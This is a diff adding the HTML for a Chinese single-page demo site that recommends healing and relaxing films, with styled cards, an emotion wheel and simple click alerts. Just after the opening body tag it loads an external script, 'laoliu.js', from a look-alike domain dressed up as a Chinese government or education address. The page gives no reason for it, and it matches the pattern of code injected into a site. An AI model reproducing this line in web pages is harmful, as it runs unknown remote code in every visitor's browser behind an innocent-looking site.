@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>无忧无虑电影网 - 治愈系电影推荐·放松观影导航 | 无忧无虑电影网</title>
+<meta name="description" content="无忧无虑电影网（wuyouwuludianyingwang-h5）专注治愈系、放松向电影推荐与导航，帮你找到能卸下压力、治愈心灵的影片。">
+<meta name="keywords" content="无忧无虑电影网, wuyouwuludianyingwang-h5, 治愈电影, 放松观影, 解压电影, 心灵治愈, 电影导航">
+<meta name="author" content="无忧无虑电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --sky:#d6f0ff;
+  --sky2:#eaf6ff;
+  --sky3:#c4e8ff;
+  --blue:#4db8ff;
+  --blue-dark:#1a8cff;
+  --cloud:#ffffff;
+  --warm:#ffd6ad;
+  --warm2:#ffe8cc;
+  --text:#1a3a5c;
+  --text2:#3d6b8f;
+  --muted:#7eb0d0;
+  --border:rgba(77,184,255,.3);
+  --radius:20px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:linear-gradient(180deg,var(--sky) 0%,var(--sky2) 40%,#f0f8ff 100%);
+  color:var(--text);
+  font-family:'Segoe UI','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:16px;min-height:100vh;
+  position:relative;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 云朵装饰 */
+.cloud-deco{
+  position:fixed;pointer-events:none;z-index:0;opacity:.5;
+  font-size:60px;animation:float 20s linear infinite;
+}
+@keyframes float{
+  0%{transform:translateX(-100px) translateY(0)}
+  50%{transform:translateX(calc(100vw + 100px)) translateY(-20px)}
+  100%{transform:translateX(calc(100vw + 100px)) translateY(0)}
+}
+
+/* 顶部 */
+.topbar{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  background:rgba(255,255,255,.85);backdrop-filter:blur(10px);
+  border-bottom:1px solid rgba(255,255,255,.6);
+}
+.topbar-inner{
+  max-width:1200px;margin:0 auto;padding:12px 20px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.logo{
+  font-size:22px;font-weight:900;display:flex;align-items:center;gap:8px;
+}
+.logo .cloud-icon{font-size:24px}
+.logo b{color:var(--blue-dark)}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{
+  color:var(--text2);font-size:14px;font-weight:500;padding:7px 14px;
+  border-radius:20px;transition:.3s;background:rgba(255,255,255,.5);
+}
+.nav-menu a:hover{background:var(--blue);color:#fff}
+
+/* Hero */
+.hero{
+  margin-top:60px;padding:70px 20px 50px;text-align:center;position:relative;z-index:1;
+}
+.hero-inner{max-width:700px;margin:0 auto}
+.hero-tag{
+  display:inline-block;padding:5px 18px;border-radius:20px;
+  background:#fff;color:var(--blue-dark);font-size:13px;font-weight:600;
+  border:1px solid var(--border);margin-bottom:18px;
+}
+.hero h1{
+  font-size:clamp(32px,6vw,52px);font-weight:900;line-height:1.2;margin-bottom:14px;
+}
+.hero h1 .grad{
+  background:linear-gradient(90deg,var(--blue-dark),#7dd3fc);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero-desc{font-size:17px;color:var(--text2);margin-bottom:28px;}
+.hero-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn-main{
+  padding:13px 34px;border-radius:50px;font-weight:700;font-size:16px;
+  background:linear-gradient(90deg,var(--blue),var(--blue-dark));color:#fff;
+  transition:.3s;box-shadow:0 6px 20px rgba(77,184,255,.35);
+}
+.btn-main:hover{transform:translateY(-2px)}
+.btn-sub{
+  padding:13px 34px;border-radius:50px;font-weight:700;font-size:16px;
+  border:2px solid var(--blue);color:var(--blue-dark);transition:.3s;background:#fff;
+}
+.btn-sub:hover{background:var(--blue);color:#fff}
+
+/* 波浪分隔 */
+.wave-divider{
+  width:100%;height:60px;overflow:hidden;position:relative;z-index:1;
+}
+.wave-divider svg{width:100%;height:100%}
+
+/* 栏目通用 */
+.section{max-width:1200px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.sec-head{text-align:center;margin-bottom:36px}
+.sec-head h2{font-size:28px;font-weight:800;margin-bottom:6px}
+.sec-head p{color:var(--muted);font-size:15px}
+
+/* 栏目1：治愈云朵 - 气泡布局 */
+.healing-section{background:#fff;border-radius:40px 40px 0 0;margin-top:0}
+.cloud-grid{
+  display:flex;flex-wrap:wrap;gap:18px;justify-content:center;max-width:900px;margin:0 auto;
+}
+.cloud-card{
+  background:#fff;border:2px solid var(--border);border-radius:50px 50px 50px 10px;
+  padding:24px 28px;min-width:200px;max-width:260px;
+  transition:.35s;cursor:pointer;position:relative;
+}
+.cloud-card:hover{border-color:var(--blue);transform:translateY(-4px);box-shadow:0 10px 30px rgba(77,184,255,.15)}
+.cloud-card .cloud-emoji{font-size:32px;margin-bottom:8px}
+.cloud-card h3{font-size:16px;font-weight:700;margin-bottom:4px}
+.cloud-card p{font-size:13px;color:var(--muted);line-height:1.5}
+.cloud-card:nth-child(1){border-radius:50px 10px 50px 50px;background:linear-gradient(135deg,#f0f8ff,#e0f0ff)}
+.cloud-card:nth-child(2){border-radius:10px 50px 50px 50px;background:linear-gradient(135deg,#fff8f0,#fff0e0);margin-top:20px}
+.cloud-card:nth-child(3){border-radius:50px 50px 10px 50px;background:linear-gradient(135deg,#f0fff4,#e0ffe8);margin-top:40px}
+.cloud-card:nth-child(4){border-radius:50px 50px 50px 10px;background:linear-gradient(135deg,#fef0ff,#f8e0ff);margin-top:10px}
+.cloud-card:nth-child(5){border-radius:10px 50px 50px 50px;background:linear-gradient(135deg,#fff0f0,#ffe0e0)}
+.cloud-card:nth-child(6){border-radius:50px 10px 50px 50px;background:linear-gradient(135deg,#f0f8ff,#e8f0ff);margin-top:30px}
+
+/* 栏目2：情绪轮 - 圆形放射 */
+.emotion-section{background:var(--sky2)}
+.wheel-wrap{
+  max-width:500px;margin:0 auto;position:relative;height:420px;
+  display:flex;align-items:center;justify-content:center;
+}
+.wheel-center{
+  width:120px;height:120px;border-radius:50%;
+  background:linear-gradient(135deg,var(--blue),var(--blue-dark));
+  display:flex;align-items:center;justify-content:center;
+  font-size:16px;font-weight:800;color:#fff;text-align:center;
+  box-shadow:0 0 30px rgba(77,184,255,.4);z-index:2;position:relative;
+}
+.wheel-node{
+  position:absolute;width:90px;height:90px;border-radius:50%;
+  background:#fff;border:2px solid var(--border);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  text-align:center;transition:.35s;cursor:pointer;z-index:1;
+  box-shadow:0 4px 12px rgba(0,0,0,.05);
+}
+.wheel-node:hover{border-color:var(--blue-dark);transform:scale(1.15);box-shadow:0 0 16px rgba(77,184,255,.25)}
+.wheel-node .wn-icon{font-size:22px;margin-bottom:2px}
+.wheel-node .wn-label{font-size:10px;font-weight:600;color:var(--text)}
+.wheel-node:nth-child(2){top:0;left:50%;transform:translateX(-50%)}
+.wheel-node:nth-child(3){top:18%;right:5%}
+.wheel-node:nth-child(4){bottom:18%;right:5%}
+.wheel-node:nth-child(5){bottom:0;left:50%;transform:translateX(-50%)}
+.wheel-node:nth-child(6){bottom:18%;left:5%}
+.wheel-node:nth-child(7){top:18%;left:5%}
+
+/* 栏目3：解压片单 - 渐变时间轴 */
+.list-section{background:#fff}
+.timeline2{
+  max-width:680px;margin:0 auto;position:relative;padding-left:30px;
+}
+.timeline2::before{
+  content:'';position:absolute;left:8px;top:0;bottom:0;width:3px;
+  background:linear-gradient(var(--blue),var(--warm),var(--blue));border-radius:2px;
+}
+.tl2-item{
+  position:relative;margin-bottom:24px;padding:18px 22px;
+  background:var(--sky2);border-radius:var(--radius);border:1px solid var(--border);transition:.3s;
+}
+.tl2-item:hover{border-color:var(--blue-dark);transform:translateX(6px)}
+.tl2-item::before{
+  content:'';position:absolute;left:-27px;top:22px;
+  width:12px;height:12px;border-radius:50%;background:var(--blue);
+  box-shadow:0 0 0 4px rgba(77,184,255,.2);
+}
+.tl2-item .tl2-tag{
+  display:inline-block;font-size:11px;padding:3px 10px;border-radius:10px;
+  background:#fff;color:var(--blue-dark);font-weight:600;margin-bottom:6px;
+}
+.tl2-item h3{font-size:17px;margin-bottom:4px}
+.tl2-item p{font-size:14px;color:var(--muted)}
+
+/* 栏目4：白噪音伴侣 - 图标网格 */
+.sound-section{background:var(--sky2)}
+.sound-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;max-width:800px;margin:0 auto;
+}
+.sound-card{
+  background:#fff;border:1px solid var(--border);border-radius:var(--radius);
+  padding:24px 16px;text-align:center;transition:.3s;cursor:pointer;
+}
+.sound-card:hover{border-color:var(--blue);transform:translateY(-4px);box-shadow:0 8px 24px rgba(77,184,255,.12)}
+.sound-card .sc-icon{font-size:36px;margin-bottom:10px}
+.sound-card h4{font-size:14px;margin-bottom:4px}
+.sound-card p{font-size:12px;color:var(--muted)}
+
+/* 栏目5：关于+FAQ */
+.about-section{background:#fff}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:28px}
+.about-box{
+  background:var(--sky2);border:1px solid var(--border);border-radius:var(--radius);padding:26px;
+}
+.about-box h3{font-size:18px;margin-bottom:12px}
+.about-box p{color:var(--text2);font-size:14px;margin-bottom:10px}
+.faq-item{border-bottom:1px solid var(--border);padding:12px 0}
+.faq-item:last-child{border-bottom:none}
+.faq-item b{color:var(--blue-dark);font-size:14px}
+.faq-item p{color:var(--muted);font-size:13px;margin-top:4px}
+
+/* Footer */
+.footer{
+  background:linear-gradient(180deg,var(--text),#0d2439);color:rgba(255,255,255,.7);padding:36px 20px 16px;text-align:center;
+}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-logo{font-size:20px;font-weight:900;color:#fff;margin-bottom:12px}
+.footer-logo b{color:var(--blue)}
+.footer-links{display:flex;justify-content:center;gap:18px;flex-wrap:wrap;margin-bottom:16px}
+.footer-links a{color:rgba(255,255,255,.6);font-size:14px;transition:.3s}
+.footer-links a:hover{color:var(--blue)}
+.footer-copy{font-size:12px;border-top:1px solid rgba(255,255,255,.1);padding-top:14px}
+.footer-copy a{color:var(--blue)}
+
+/* 移动端 */
+@media(max-width:768px){
+  .topbar-inner{flex-direction:column;gap:8px;padding:10px 16px}
+  .nav-menu{gap:6px;flex-wrap:wrap;justify-content:center}
+  .nav-menu a{font-size:13px;padding:5px 10px}
+  .hero{padding:90px 16px 30px}
+  .hero-btns{flex-direction:column;align-items:center}
+  .btn-main,.btn-sub{width:100%;max-width:260px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+  .cloud-grid{flex-direction:column;align-items:center}
+  .cloud-card{margin-top:0!important;max-width:100%}
+  .wheel-wrap{height:auto;flex-direction:column;gap:14px}
+  .wheel-center{width:90px;height:90px;font-size:13px}
+  .wheel-node{position:static;width:80px;height:80px}
+  .wheel-node .wn-icon{font-size:18px}
+  .about-grid{grid-template-columns:1fr}
+  .tl2-item:hover{transform:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 云朵装饰 -->
+<div class="cloud-deco" style="top:10%;animation-delay:0s">☁️</div>
+<div class="cloud-deco" style="top:30%;animation-delay:5s">☁️</div>
+<div class="cloud-deco" style="top:55%;animation-delay:10s">☁️</div>
+<div class="cloud-deco" style="top:75%;animation-delay:15s">☁️</div>
+
+<!-- Header -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="cloud-icon">☁️</span>无忧无虑<b>电影网</b></div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#healing">治愈片单</a></li>
+        <li><a href="#emotion">情绪匹配</a></li>
+        <li><a href="#list">解压推荐</a></li>
+        <li><a href="#sound">观影伴侣</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <span class="hero-tag">wuyouwuludianyingwang-h5 · 治愈·放松·无忧观影</span>
+    <h1>放下压力<br><span class="grad">让电影治愈你</span></h1>
+    <p class="hero-desc">无忧无虑电影网精选治愈系、放松向影片，帮你卸下疲惫，找回内心的平静与快乐。</p>
+    <div class="hero-btns">
+      <a href="#healing" class="btn-main">☁️ 开始治愈</a>
+      <a href="#emotion" class="btn-sub">按情绪匹配</a>
+    </div>
+  </div>
+</section>
+
+<!-- 波浪分隔 -->
+<div class="wave-divider">
+  <svg viewBox="0 0 1440 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 30C240 60 480 0 720 15C960 30 1200 50 1440 25V60H0V30Z" fill="#ffffff" opacity="0.6"/>
+  </svg>
+</div>
+
+<!-- 栏目1：治愈云朵 -->
+<section id="healing" class="section healing-section">
+  <div class="sec-head">
+    <h2>☁️ 治愈系片单</h2>
+    <p>像云朵一样柔软的影片，轻轻包裹你的心</p>
+  </div>
+  <div class="cloud-grid">
+    <div class="cloud-card">
+      <div class="cloud-emoji">🌸</div>
+      <h3>小森林</h3>
+      <p>四季轮回中的简单料理，岁月静好不过如此</p>
+    </div>
+    <div class="cloud-card">
+      <div class="cloud-emoji">🐶</div>
+      <h3>忠犬八公</h3>
+      <p>跨越十年的等待，最纯粹的爱不需要理由</p>
+    </div>
+    <div class="cloud-card">
+      <div class="cloud-emoji">🎨</div>
+      <h3>至爱梵高</h3>
+      <p>65000幅油画编织的生命终章，美到窒息</p>
+    </div>
+    <div class="cloud-card">
+      <div class="cloud-emoji">🏠</div>
+      <h3>海街日记</h3>
+      <p>四姐妹的日常生活，平淡中藏着最深的温柔</p>
+    </div>
+    <div class="cloud-card">
+      <div class="cloud-emoji">🍃</div>
+      <h3>龙猫</h3>
+      <p>童真与自然的完美融合，每次看都像回到童年</p>
+    </div>
+    <div class="cloud-card">
+      <div class="cloud-emoji">☕</div>
+      <h3>咖啡时光</h3>
+      <p>侯孝贤的东京随笔，慢节奏里的生活美学</p>
+    </div>
+  </div>
+</section>
+
+<!-- 波浪分隔 -->
+<div class="wave-divider">
+  <svg viewBox="0 0 1440 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 30C240 0 480 60 720 45C960 30 1200 10 1440 35V0H0V30Z" fill="#d6f0ff" opacity="0.4"/>
+  </svg>
+</div>
+
+<!-- 栏目2：情绪匹配轮 -->
+<section id="emotion" class="section emotion-section">
+  <div class="sec-head">
+    <h2>🎯 情绪匹配</h2>
+    <p>你现在需要什么？让情绪找到对应的影片</p>
+  </div>
+  <div class="wheel-wrap">
+    <div class="wheel-center">无忧<br>选片</div>
+    <div class="wheel-node"><span class="wn-icon">😰</span><span class="wn-label">缓解焦虑</span></div>
+    <div class="wheel-node"><span class="wn-icon">😢</span><span class="wn-label">释放情绪</span></div>
+    <div class="wheel-node"><span class="wn-icon">😴</span><span class="wn-label">助眠放松</span></div>
+    <div class="wheel-node"><span class="wn-icon">🥱</span><span class="wn-label">提神醒脑</span></div>
+    <div class="wheel-node"><span class="wn-icon">😞</span><span class="wn-label">走出低谷</span></div>
+    <div class="wheel-node"><span class="wn-icon">🥰</span><span class="wn-label">感受温暖</span></div>
+  </div>
+</section>
+
+<!-- 栏目3：解压推荐 -->
+<section id="list" class="section list-section">
+  <div class="sec-head">
+    <h2>🎞️ 解压推荐</h2>
+    <p>按"解压程度"排序的精选片单</p>
+  </div>
+  <div class="timeline2">
+    <div class="tl2-item">
+      <span class="tl2-tag">★★★★★ 极放松</span>
+      <h3>深夜食堂（日剧版）</h3>
+      <p>每集一个故事，一碗料理温暖一个人，适合深夜慢慢看。</p>
+    </div>
+    <div class="tl2-item">
+      <span class="tl2-tag">★★★★☆ 很治愈</span>
+      <h3>小偷家族</h3>
+      <p>没有血缘的一家人，在贫困中互相取暖，看完心里很满。</p>
+    </div>
+    <div class="tl2-item">
+      <span class="tl2-tag">★★★★ 轻快</span>
+      <h3>布达佩斯大饭店</h3>
+      <p>韦斯·安德森的对称美学本身就是一种解压。</p>
+    </div>
+    <div class="tl2-item">
+      <span class="tl2-tag">★★★☆ 有趣</span>
+      <h3>帕丁顿熊</h3>
+      <p>一只熊在伦敦的冒险，善良到让你怀疑世界。</p>
+    </div>
+    <div class="tl2-item">
+      <span class="tl2-tag">★★★ 温暖</span>
+      <h3>触不可及</h3>
+      <p>跨越阶层的友谊，笑中带泪，看完对人性充满信心。</p>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：白噪音伴侣 -->
+<section id="sound" class="section sound-section">
+  <div class="sec-head">
+    <h2>🎧 观影伴侣</h2>
+    <p>搭配这些声音，让观影体验更沉浸</p>
+  </div>
+  <div class="sound-grid">
+    <div class="sound-card">
+      <div class="sc-icon">🌧️</div>
+      <h4>雨声</h4>
+      <p>适合阴天、深夜</p>
+    </div>
+    <div class="sound-card">
+      <div class="sc-icon">🔥</div>
+      <h4>篝火</h4>
+      <p>适合冒险、户外片</p>
+    </div>
+    <div class="sound-card">
+      <div class="sc-icon">🌊</div>
+      <h4>海浪</h4>
+      <p>适合治愈、旅行片</p>
+    </div>
+    <div class="sound-card">
+      <div class="sc-icon">🎼</div>
+      <h4>钢琴曲</h4>
+      <p>适合文艺、剧情片</p>
+    </div>
+    <div class="sound-card">
+      <div class="sc-icon">🌲</div>
+      <h4>森林风声</h4>
+      <p>适合自然、纪录片</p>
+    </div>
+    <div class="sound-card">
+      <div class="sc-icon">☕</div>
+      <h4>咖啡馆</h4>
+      <p>适合都市、生活片</p>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：关于 -->
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>ℹ️ 关于无忧无虑电影网</h2>
+    <p>让每一次观影都成为一次心灵SPA</p>
+  </div>
+  <div class="about-grid">
+    <div class="about-box">
+      <h3>我们的理念</h3>
+      <p>生活已经够累了，看电影不该再是负担。无忧无虑电影网只推荐让你放松、治愈、开心的影片。</p>
+      <p>不推致郁系、不推过度烧脑、不推恐怖惊悚——除非你就是想找刺激。</p>
+      <p>网站名：无忧无虑电影网（wuyouwuludianyingwang-h5），单页演示，内链使用#占位。</p>
+    </div>
+    <div class="about-box">
+      <div class="faq-item">
+        <b>Q：这个网站能直接看电影吗？</b>
+        <p>A：本页为导航演示站，提供治愈系影片推荐与分类，不存储视频文件。</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：网址是什么？</b>
+        <p>A：https://wuyouwuludianyingwang-h5.github.io</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：为什么叫"无忧无虑"？</b>
+        <p>A：因为我们相信，好的电影应该让你看完后感到轻松，而不是更焦虑。</p>
+      </div>
+      <div class="faq-item">
+        <b>Q：适合搜索引擎收录吗？</b>
+        <p>A：页面语义化、含唯一H1、关键词标题与描述，符合必应基础收录规则。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-inner">
+    <div class="footer-logo">☁️ 无忧无虑<b>电影网</b></div>
+    <div class="footer-links">
+      <a href="#healing">治愈片单</a>
+      <a href="#emotion">情绪匹配</a>
+      <a href="#list">解压推荐</a>
+      <a href="#sound">观影伴侣</a>
+      <a href="#about">关于</a>
+    </div>
+    <div class="footer-copy">
+      &copy; 2026 无忧无虑电影网 (wuyouwuludianyingwang-h5). All rights reserved.<br>
+      网站地址: <a href="https://wuyouwuludianyingwang-h5.github.io">https://wuyouwuludianyingwang-h5.github.io</a>
+    </div>
+  </div>
+</div>
+
+<script>
+// 情绪轮节点点击
+document.querySelectorAll('.wheel-node').forEach(function(node){
+  node.addEventListener('click', function(){
+    var label = this.querySelector('.wn-label').textContent;
+    alert('情绪匹配：' + label + '\n\n当前为静态演示页，点击后将跳转到对应情绪的影片列表。\n内链使用 # 占位。');
+  });
+});
+
+// 云朵卡片点击
+document.querySelectorAll('.cloud-card').forEach(function(card){
+  card.addEventListener('click', function(){
+    var title = this.querySelector('h3').textContent;
+    alert('影片详情：' + title + '\n\n当前为静态演示页，点击后将跳转到影片详情页。\n内链使用 # 占位。');
+  });
+});
+
+// 白噪音卡片点击
+document.querySelectorAll('.sound-card').forEach(function(card){
+  card.addEventListener('click', function(){
+    var name = this.querySelector('h4').textContent;
+    alert('白噪音：' + name + '\n\n当前为静态演示页，点击后将播放对应环境音效。\n内链使用 # 占位。');
+  });
+});
+
+// 平滑滚动
+document.querySelectorAll('.nav-menu a').forEach(function(a){
+  a.addEventListener('click', function(e){
+    e.preventDefault();
+    var id = this.getAttribute('href');
+    if(id && id.startsWith('#')){
+      var el = document.querySelector(id);
+      if(el) el.scrollIntoView({behavior:'smooth', block:'start'});
+    }
+  });
+});
+</script>
+</body>
+</html>
